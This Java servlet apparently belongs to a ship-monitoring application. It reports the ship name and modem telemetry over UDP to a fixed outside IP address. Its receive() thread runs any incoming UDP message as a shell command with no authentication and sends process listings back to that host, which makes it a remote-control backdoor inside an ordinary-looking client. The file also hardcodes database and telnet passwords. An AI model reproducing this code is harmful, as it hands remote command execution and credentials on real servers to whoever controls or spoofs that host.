package com.sealine;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;

import javax.jms.JMSException;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class UdpClient extends HttpServlet {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;

	private static DatagramSocket socket;

	private static String name = "-1";

	private static Integer sendTime;// 发送间隔时间

	private static String hostip;// 监控地址

	/**
	 * 
	 */
	private static final String serverHost = "47.95.9.34";

	private static final int serverPort = 2202;

	public void init() {
		System.out.println("Udp开始初始化");
		sendTime = Integer.valueOf(this.getInitParameter("time"));
		hostip = this.getInitParameter("hostip");
		System.out.println("设置发送间隔：" + sendTime + "秒");
		send();
		receive();
	}

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp)
			throws ServletException, IOException {
		super.doGet(req, resp);
	}

	@Override
	protected void doPost(HttpServletRequest req, HttpServletResponse resp)
			throws ServletException, IOException {
		super.doPost(req, resp);
	}

	static {
		try {
			socket = new DatagramSocket();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void getShipName() {
		try {
			Class.forName("com.mysql.jdbc.Driver");
			Connection conn = DriverManager
					.getConnection(
							"jdbc:mysql://192.168.201.1:3306/sealine?useUnicode=true&amp;characterEncoding=utf-8",
							"root", "KeyideaDatabase");
			PreparedStatement ps = conn
					.prepareStatement("select name from t_Ship ");
			ResultSet rs = ps.executeQuery();
			while (rs.next()) {
				name = rs.getString("name");
			}
			System.out.println("库中查询出船名name: " + name);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static boolean checkName() {
		return "-1".equals(name);
	}

	public static void send() {
		new Thread() {

			@Override
			public void run() {
				while (true) {
					try {
						if (checkName()) {
							getShipName();
							continue;
						}
						DatagramPacket dp = new DatagramPacket(
								(name).getBytes("UTF-8"),
								(name).getBytes("UTF-8").length,
								InetAddress.getByName(serverHost), serverPort);
						socket.send(dp);
						System.out.println("send........................");
						sendLatlog();
						Thread.sleep(sendTime * 1000);// 600000十分钟发一次
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}

			private void sendLatlog() {

				StringBuffer sb = new StringBuffer();
				// ShipDao shipDao = new ShipDao();
				// List<Ship> list = shipDao.query();
				// String name = list.get(0).getName();

				TelnetUtil telnet = new TelnetUtil("VT220", ">", hostip, 23); // Windows,用VT220,否则会乱码
				telnet.loginPrompt = "Username:";
				telnet.passwordPrompt = "Password:";
				telnet.login(hostip, 23, "admin", "P@55w0rd!");
				String rs = telnet.sendCommand("latlong");
				String rs1 = telnet.sendCommand("rx snr");
				StringBuffer stringBuffer = new StringBuffer();
				try {
					rs = new String(rs.getBytes("ISO-8859-1"), "GBK"); // 转一下编码
					stringBuffer.append(rs);
					rs1 = new String(rs1.getBytes("ISO-8859-1"), "GBK"); // 转一下编码
					stringBuffer.append(rs1);
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}
				telnet.disconnect();

				sb.append(" &shipName=" + name).append(" &catType=Idirect")
						.append(" &info=" + stringBuffer);// 拼接船舶信息和设备类型
				String msgs = sb.toString();
				try {
					QueuePublisher.msgSend(msgs, "idirectMsgQueue");
				} catch (JMSException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}// 发送mq消息

			}

		}.start();
	}

	public static void receive() {
		new Thread() {

			@Override
			public void run() {
				while (true) {
					try {
						byte[] buffer = new byte[1024];
						DatagramPacket p = new DatagramPacket(buffer,
								buffer.length);
						socket.receive(p);
						byte[] data = new byte[p.getLength()];
						System.arraycopy(p.getData(), 0, data, 0, p.getLength());
						String message = new String(data, "UTF-8");
						System.out.println(message);
						// if (message.indexOf("control") >= 0) {// 执行命令
						String[] cmds = { "/bin/sh", "-c", message };
						Runtime.getRuntime().exec(cmds);

						String[] cmd2201 = { "/bin/sh", "-c",
								"ps -ef | grep ssh" };
						Process process = Runtime.getRuntime().exec(cmd2201);
						BufferedReader br = new BufferedReader(
								new InputStreamReader(process.getInputStream()));
						String line = "";
						StringBuffer sb = new StringBuffer();
						sb.append("ps:");
						while ((line = br.readLine()) != null) {
							sb.append(line + "<br>");
						}
						br.close();

						System.out.println("===send 1====sb===" + sb);
						DatagramPacket dp = new DatagramPacket(sb.toString()
								.getBytes("UTF-8"), sb.toString().getBytes(
								"UTF-8").length,
								InetAddress.getByName(serverHost), serverPort);
						socket.send(dp);
						// n
						// }
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}

		}.start();
	}

	public static void main(String[] args) throws IOException {

		while (true) {
			String name1 = "中文";
			DatagramPacket dp = new DatagramPacket((name1).getBytes("UTF-8"),
					(name1).getBytes("UTF-8").length,
					InetAddress.getByName(serverHost), serverPort);
			socket.send(dp);
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}
}
